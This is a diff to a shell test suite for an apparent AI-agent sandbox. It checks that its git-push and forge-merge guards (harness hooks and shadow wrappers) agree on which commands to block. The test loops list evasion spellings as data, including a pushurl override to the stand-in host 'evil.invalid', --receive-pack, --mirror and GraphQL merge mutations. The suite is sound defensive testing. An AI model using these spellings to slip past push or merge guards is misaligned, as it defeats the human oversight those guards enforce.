@@ -8,6 +8,11 @@ setup() {
     SANDBOX_DIR="$BATS_TEST_DIRNAME/../docker"
     REPO_ROOT="$BATS_TEST_DIRNAME/.."
     LIB="$REPO_ROOT/bin/dejima-provider-lib.sh"
+    # The guards and their hooks source the shared policy from the path the
+    # Dockerfile installs it at, which is not where the checkout holds it. The
+    # test below named for the COPY line is what keeps the image path honest,
+    # since nothing here would notice it stopped being copied.
+    export DEJIMA_GUARD_LIB="$SANDBOX_DIR/guard-lib.sh"
 }
 
 # Runs one function from the provider library in a subshell, the same way
@@ -3885,6 +3890,16 @@ _git_guard() {
         DEJIMA_FORGE_NAME=gitea bash "$SANDBOX_DIR/git-guard.sh" -C "$repo" "$@" 2>&1 | head -1
 }
 
+# The hook's verdict on a command string, the way a harness hands it over.
+# Prints whatever it said; a block is an exit of 2, so the caller reads the
+# text rather than the status.
+_push_hook() {  # <repo> <command string>
+    printf '{"tool_input":{"command":%s},"cwd":%s}' \
+        "$(jq -Rn --arg c "$2" '$c')" "$(jq -Rn --arg d "$1" '$d')" \
+        | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
+          DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true
+}
+
 _guard_repo() {
     local d
     d="$(mktemp -d "$BATS_TEST_TMPDIR/guardrepo.XXXXXX")"
@@ -4011,17 +4026,26 @@ _guard_repo() {
 }
 
 @test "the two push guards agree on the same pushes" {
-    # Two implementations of one rule is the drift this repo warns about, so
-    # the overlap is pinned rather than assumed: for each case, the hook and
-    # the shadow reach the same verdict.
+    # Two implementations of one rule is the drift this repo warns about, and
+    # they had already drifted: the shadow skipped -o and read --repo, the hook
+    # did neither, so `git push -o x origin main` was fine to one and a hard
+    # refusal from the other. They now call the same function, and this is what
+    # says so for every form either one used to read differently (#365).
     local repo cmd hook_out guard_out hook_blocked guard_blocked
     repo="$(_guard_repo)"
-    for cmd in "git push origin main" "git push elsewhere" "git push origin feature"; do
-        # `|| true` because the hook signals a block by exiting 2, which would
-        # otherwise abort the test body before the comparison.
-        hook_out="$(printf '{"tool_input":{"command":"%s"},"cwd":"%s"}' "$cmd" "$repo" \
-            | DEJIMA=1 DEJIMA_PUSH_HOSTS="forge.invalid" DEJIMA_BLOCKED_BRANCHES="main" \
-              DEJIMA_FORGE_NAME=gitea bash "$REPO_ROOT/hooks/git-push-guard.sh" 2>&1 || true)"
+    git -C "$repo" branch main
+    for cmd in "git push origin main" "git push elsewhere" "git push origin feature" \
+               "git push" "git push origin" "git push origin HEAD" \
+               "git push -o ci.skip origin main" "git push --push-option=x origin main" \
+               "git push --repo origin main" "git push --repo=origin main" \
+               "git push --receive-pack /bin/true origin main" \
+               "git push --all origin" "git push --mirror origin" \
+               "git push origin feature main" \
+               "git push --git-dir=/nowhere/.git origin main" \
+               "git -c remote.origin.pushurl=git@evil.invalid:o/r.git push origin feature" \
+               "git push nosuchremote feature" \
+               "git status --short" "git --git-dir=/nowhere/.git status"; do
+        hook_out="$(_push_hook "$repo" "$cmd")"
         # shellcheck disable=SC2086
         guard_out="$(_git_guard "$repo" ${cmd#git } || true)"
         hook_blocked=0; guard_blocked=0
@@ -4034,6 +4058,16 @@ _guard_repo() {
             return 1
         }
     done
+
+    # Agreement is worth nothing if it is agreement on allowing everything, so
+    # the list above has to contain both answers.
+    guard_blocked=0
+    for cmd in "push origin main" "push --all origin"; do
+        # shellcheck disable=SC2086
+        guard_out="$(_git_guard "$repo" $cmd || true)"
+        [[ "$guard_out" == *"Blocked by dejima"* ]] && guard_blocked=1
+    done
+    [ "$guard_blocked" -eq 1 ] || { echo "the agreed cases include no refusal"; return 1; }
 }
 
 # A refusal is three things, and the tests asserted one: the message. A guard
@@ -4579,9 +4613,15 @@ comment forge-cli issue comment"
     # nothing when they ask for neither.
     grep -q 'if \[ -n "$_shadow_cli_list" \]' "$e" \
         || { echo "the forge shadow is unconditional"; return 1; }
-    grep -q 'DEJIMA_MERGE_BLOCK' "$e" \
+    # The set itself comes from the library, so that what the shadow is linked
+    # over and what hooks/merge-guard.sh checks a command against cannot
+    # disagree - which is the whole of #365 in one line.
+    grep -q 'dejima_forge_commands' "$e" \
+        || { echo "entrypoint derives the shadow set itself again"; return 1; }
+    local f="$SANDBOX_DIR/guard-lib.sh"
+    sed -n '/^dejima_forge_commands()/,/^}/p' "$f" | grep -q 'DEJIMA_MERGE_BLOCK' \
         || { echo "a blocked merge no longer reaches the shadow"; return 1; }
-    grep -q 'DEJIMA_DISCLOSE' "$e" \
+    sed -n '/^dejima_forge_commands()/,/^}/p' "$f" | grep -q 'DEJIMA_DISCLOSE' \
         || { echo "a disclosure no longer reaches the shadow"; return 1; }
     # And a merge_block naming a command the forge does not ship is refused
     # rather than looking enforced.
@@ -10126,4 +10166,95 @@ _host_clamp() {  # _host_clamp <EGRESS_HOST_PORTS value>
         [ "$status" -eq 0 ] \
             || { echo "bin/dejima does not pass $v to the filter container"; return 1; }
     done
+}
+
+# The policy library is what makes a bypass fixable once instead of twice, so
+# the two things that could quietly undo that are pinned: the image has to
+# carry it, and nothing may reintroduce a second copy of a rule.
+@test "the shared guard policy is installed in the image and sourced by all four layers" {
+    # setup() points every guard here at the checkout's copy, which is exactly
+    # what would hide the COPY line going missing: the suite would stay green
+    # while a container had no file to source and every guard died on startup.
+    grep -qF 'COPY docker/guard-lib.sh /usr/local/lib/dejima/guard-lib.sh' \
+        "$SANDBOX_DIR/Dockerfile" \
+        || { echo "the image does not carry the shared guard policy"; return 1; }
+
+    local f
+    for f in "$SANDBOX_DIR/git-guard.sh" "$SANDBOX_DIR/forge-guard.sh" \
+             "$REPO_ROOT/hooks/git-push-guard.sh" "$REPO_ROOT/hooks/merge-guard.sh" \
+             "$SANDBOX_DIR/entrypoint.sh"; do
+        grep -q 'DEJIMA_GUARD_LIB:-/usr/local/lib/dejima/guard-lib.sh' "$f" \
+            || { echo "$f does not source the shared policy"; return 1; }
+    done
+
+    # And the decision is in one place: the host and branch checks belong to
+    # the library, so a caller carrying either again is the drift this exists
+    # to prevent.
+    # Comments excluded: both files document the contract by naming these, and
+    # that prose is the reason an operator can read either one on its own. What
+    # must not come back is CODE reading them.
+    local code v
+    for f in "$SANDBOX_DIR/git-guard.sh" "$REPO_ROOT/hooks/git-push-guard.sh"; do
+        code="$(grep -v '^[[:space:]]*#' "$f")"
+        for v in DEJIMA_PUSH_HOSTS DEJIMA_BLOCKED_BRANCHES; do
+            grep -q "$v" <<< "$code" \
+                && { echo "$f reads $v again instead of asking the library"; return 1; }
+        done
+    done
+    # Named in the library once each, where the fail directions are documented
+    # together - closed for hosts, open for branches.
+    grep -q 'DEJIMA_PUSH_HOSTS' "$SANDBOX_DIR/guard-lib.sh" \
+        || { echo "the library does not check the allowed hosts"; return 1; }
+}
+
+@test "the forge guards agree on the same commands" {
+    # The other half of #365's duplication: the hook regex-matched a command
+    # string while the shadow compared argv, so the two could not be reasoned
+    # about together. They now call the same function, and the hook applies
+    # every rule the shadow does rather than the merge block alone.
+    local d; d="$(mktemp -d "$BATS_TEST_TMPDIR/forgedrift.XXXXXX")"
+    _repo_guard_shim "$d"
+    local env_common=(DEJIMA=1 DEJIMA_FORGE_REAL_DIR="$d/real"
+                      DEJIMA_FORGE_REPO=own/thing
+                      DEJIMA_MERGE_BLOCK="gh pr merge"
+                      DEJIMA_FORGE_REPO_FLAGS="--repo -R" DEJIMA_FORGE_REPO_ENV=GH_REPO
+                      DEJIMA_FORGE_REPO_PATHS="api:repos")
+    local cmd hook_out shadow_out hook_blocked shadow_blocked payload refused=0
+    for cmd in "gh pr merge 3" "gh pr view 3" "gh issue create --title x" \
+               "gh --repo other/thing issue create --title x" \
+               "gh api repos/other/thing/issues" \
+               "gh api repos/own/thing/issues" \
+               "gh api user/repos" \
+               "gh api graphql -f query=mutation{mergePullRequest}" \
+               "/usr/local/bin/gh pr merge 3" \
+               "echo gh pr merge 3"; do
+        payload=$(jq -n --arg c "$cmd" '{tool_input: {command: $c}}')
+        hook_out="$(printf '%s' "$payload" \
+            | env "${env_common[@]}" bash "$REPO_ROOT/hooks/merge-guard.sh" 2>&1 || true)"
+        # The shadow is only ever reached as the command itself, so a
+        # path-qualified or embedded spelling is the same argv to it.
+        # shellcheck disable=SC2086
+        set -- ${cmd#*gh }
+        shadow_out="$(env "${env_common[@]}" "$d/gh" "$@" 2>&1 || true)"
+        hook_blocked=0; shadow_blocked=0
+        [[ "$hook_out" == *"Blocked by"* ]] && hook_blocked=1
+        [[ "$shadow_out" == *"Blocked by dejima"* ]] && shadow_blocked=1
+        # `echo gh pr merge 3` is the one case where they must differ: the hook
+        # sees a segment whose first word is echo and leaves it alone, and the
+        # shadow was handed the argv directly so there is no echo in it.
+        if [ "$cmd" = "echo gh pr merge 3" ]; then
+            [ "$hook_blocked" -eq 0 ] \
+                || { echo "the hook blocked a command that merely names gh"; return 1; }
+            continue
+        fi
+        [ "$hook_blocked" -eq "$shadow_blocked" ] || {
+            echo "disagreement on '$cmd': hook=$hook_blocked shadow=$shadow_blocked" >&2
+            echo "  hook:   $hook_out" >&2
+            echo "  shadow: $shadow_out" >&2
+            return 1
+        }
+        [ "$hook_blocked" -eq 1 ] && refused=$((refused + 1))
+    done
+    # Agreement on allowing everything would satisfy the loop above.
+    [ "$refused" -ge 4 ] || { echo "only $refused of those were refused"; return 1; }
 }
